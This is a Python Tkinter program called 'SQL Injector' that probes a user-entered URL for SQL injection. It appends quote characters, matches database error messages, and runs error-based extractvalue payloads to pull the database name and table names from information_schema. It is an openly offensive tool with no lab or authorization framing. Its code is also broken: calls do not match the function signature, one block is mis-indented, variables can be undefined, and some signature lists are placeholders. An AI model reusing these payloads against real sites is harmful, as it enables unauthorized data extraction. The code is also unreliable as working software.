from tkinter import *
from tkinter import ttk
import requests
from bs4 import BeautifulSoup as BS
from tkinter import messagebox as msg


def Main(test, get_database_type, dbname, tablenames):
    if test:
        urls = [test + "'", test + '"', test[:-4] + ';', test + ")", test + "')",
                test + '")', test + '*']
        vulnerable_text = ['MySQL Query fail:', '/www/htdocs/', 'Query failed', 'mysqli_fetch_array()', 'mysqli_result',
                           'Warning: ', 'MySQL server', 'SQL syntax', 'You have an error in your SQL syntax;',
                           'mssql_query()', "Incorrect s>"]
        try:
            for url in urls:
                results = requests.get(url)
                data = results.text
                soup = BS(data, features='html.parser')
                for vuln in vulnerable_text:
                    if vuln in data:
                        string = vuln
                        vulnerable = True
            if vulnerable:
                vulnerable = "Vulnerable"
        except:
            vulnerable = 'Site not Vulnerable !'
       
        if tablenames:
            print("Extracting tables names...")
            link = str(
                tablenames) + " and extractvalue(1,(select%20group_concat(table_name) from%20information_schema.tables where table_schema=database()))"
            results = requests.get(link)
            data = results.text
            str_num = str(data).find('error: ')
            str1_num = data[str_num:]
            str1 = str1_num[8:]
            str2 = str1.find('\'')
            str3 = str1[:str2]
            tables = str3
        if dbname:
            link = dbname + " and extractvalue(1,concat(1,(select database()))) --"  # " and extractvalue(0x0a,concat(0x0a,(select database())))--"
            print(link)
            results = requests.get(link)
            data = results.text
            str_num = str(data).find('error:')
            print(str_num)
            str1_num = data[str_num:]
            str1 = str1_num[8:]
            str2 = str1.find('\'')
            str3 = str1[:str2]
            if str_num == -1:
                DBname = 'Access Denied'
            else:
                DBname = str3
        if get_database_type:
            print("hello")
            urls = [get_database_type + "'", get_database_type + '"', get_database_type[:-4] + ';',
                    get_database_type + ")", get_database_type + "')", get_database_type + '")',
                    get_database_type + '*']
            DBDict = {
                "MySQL": ['MySQL', 'MySQL Query fail:', 'SQL syntax', 'You have an error in your SQL syntax',
                          'mssql_query()', 'mssql_num_rows()'],
                "PostGre": ['dafafdfds'],
                "Microsoft_SQL": ['dafafdfds'],
                "Oracle": ['dafafdfds'],
                "Advantage_Database": ['dafafdfds'],
                "Firebird": ['dafafdfds']
            }
            DBFound = 0
            DBType = ''
            try:
                for url in urls:
                    results = requests.get(url)
                    data = results.text
                    soup = BS(data, features='html.parser')
                    print("reached")
                    while not DBFound:
                        for db, identifiers in DBDict.items():
                            for dbid in identifiers:
                                if dbid in data:
                                    DBType = db
                                    DBFound = 1
                                    print("reached2")
                                    break
            except:
                DBType = 'Unknown'
        else:
            msg.showerror("Empty", "Please Enter a URL!")
    if vulnerable:
        return DBType, DBname, tables, vulnerable
    else:
        return None, None, None, vulnerable

if __name__ == '__main__':
    
    def scan_window():
        global mainframe

        def scan():
            url = url_var.get()
            response = Main(url, url, url, url, False, False, False)

            db_type.set(response[0])
            db_name.set(response[1])
            db_table.set(response[2])
            vulnerability.set(response[3])

        homeframe.destroy()
        mainframe = Frame(window, width=620, height=600, bg="#ffee38")
        mainframe.place(x=181, y=0)

        style = ttk.Style()
        style.theme_use("clam")
        style.configure("TButton", font=('Bahnschrift semiBold SemiCondensed', 18), background="#ffee58",
                        foreground="navy", relief=RAISED)

        url_var = StringVar()
        db_type = StringVar()
        db_table = StringVar()
        db_name = StringVar()
        vulnerability = StringVar()

        ttk.Entry(mainframe, textvariable=url_var,
                  font=("Bahnschrift semiLight SemiCondensed ", 14)).place(x=190, y=70, height=40, width=250)

        Label(mainframe, text="URL :", font=("Bahnschift bold SemiCondensed ", 20), bg="#ffee38", fg="navy").place(
            x=100, y=70)

        Button(mainframe, text="SCAN", command=scan, bg="navy", fg="#ffee38", relief=GROOVE,
               font=('Bahnschrift semiBold SemiCondensed', 18), width=15).place(x=230, y=120)

        frame = PanedWindow(mainframe, width=490, height=340, relief=SUNKEN, bd=5, bg="navy").place(x=80, y=210)

        Label(frame, text="Database's Type :", font=("Bahnschrift semibold SemiCondensed ", 21),
              bg="navy", fg="#ffee38").place(x=280, y=230)
        Label(frame, text="Database's Name :", font=("Bahnschrift semibold SemiCondensed ", 21),
              bg="navy", fg="#ffee38").place(x=280, y=310)
        Label(frame, text="Database's Tables :", font=("Bahnschrift semibold SemiCondensed ", 21),
              bg="navy", fg="#ffee38").place(x=280, y=390)
        Label(frame, text="Vulnebarity : ", font=("Bahnschrift semibold SemiCondensed ", 21),
              bg="navy", fg="#ffee38").place(x=300, y=470)

        Entry(mainframe, textvariable=db_type, state="readonly", font=("Bahnschrift semiLight SemiCondensed ", 17),
              bd=4, width=19).place(x=340, y=230)
        Entry(mainframe, textvariable=db_name, state="readonly", font=("Bahnschrift semiLight SemiCondensed ", 17),
              bd=4, width=19).place(x=340, y=310)
        Entry(mainframe, textvariable=db_table, state="readonly", font=("Bahnschrift semiLight SemiCondensed ", 17),
              bd=4, width=19).place(x=340, y=390)
        Entry(mainframe, textvariable=vulnerability, state="readonly",
              font=("Bahnschrift semiLight SemiCondensed ", 17), bd=4, width=19).place(x=340, y=470)
        def sql_info_window():
        try:
            mainframe.destroy()
        except NameError:
            pass
        finally:
            homeframe.destroy()
            info_frame = Frame(window, width=620, height=600, bg="#ffee38")
            info_frame.place(x=181, y=0)

            Label(info_frame, text="About SQL Injector", font=('Bahnschrift semiBold SemiCondensed', 32),
                  bg="#ffee38").place(x=150, y=70)

            info_pane = PanedWindow(info_frame, width=500, height=300, bg="navy", relief=SUNKEN, bd=3)
            info_pane.place(x=50, y=200)

            text = '''     SQL Injection (Structured Query Language injection).
            Aplikacionet në internet bëjnë të mundur që vizitorët e ueb 
            faqeve të paraqesin dhe të marrin të dhëna prej data bazës  
            përmes internetit duke përdorur shfletuesit e tyre. 
            Data bazat janë të rëndësishme për ueb faqet moderne, ato 
            ruajnë te dhëna te ndryshme nga vizitoret, marrin informata
            nga klientët,furnizuesit e shume persona tjerë.Sulmi SQL 
            injection bëhet me insertimin e SQL query (pyetjeve) 
            përmes futjes së të dhënave prej klientit në aplikacion.
             Injektimi i suksesshëm i SQL mund të bëj të mundur leximin'''
            Label(info_pane, text=text, font=('Bahnschrift semiBold SemiCondensed', 14), fg="#ffee38",
                  bg="navy", ).place(x=-40, y=10)


    window = Tk()
    window.geometry("800x600")
    window.config(bg="#ffee38")
    window.title("SQL Injector")
    window.resizable(0, 0)
    style = ttk.Style()
    style.theme_use("clam")
    style.configure("TButton", font=('Bahnschrift semiBold SemiCondensed', 18), background="#ffee58", foreground="navy",
                    relief=RAISED)

    homeframe = Frame(window, width=620, height=600, bg="#ffee38")
    homeframe.place(x=181, y=10)

    Label(homeframe, text="Welcome to Sql Injector", font=('Bahnschrift semiBold SemiCondensed', 32),
          bg="#ffee38").place(x=130, y=70)

    left_pane = PanedWindow(window, width=180, height=600, relief=RAISED, bd=8, bg="navy").pack(side=LEFT, fill=Y)

    ttk.Button(left_pane, text="SCAN URL", width=12, command=scan_window).place(x=4, y=100)
    ttk.Button(left_pane, text="SQL INFO", width=12, command=sql_info_window).place(x=4, y=170)

    window.mainloop()

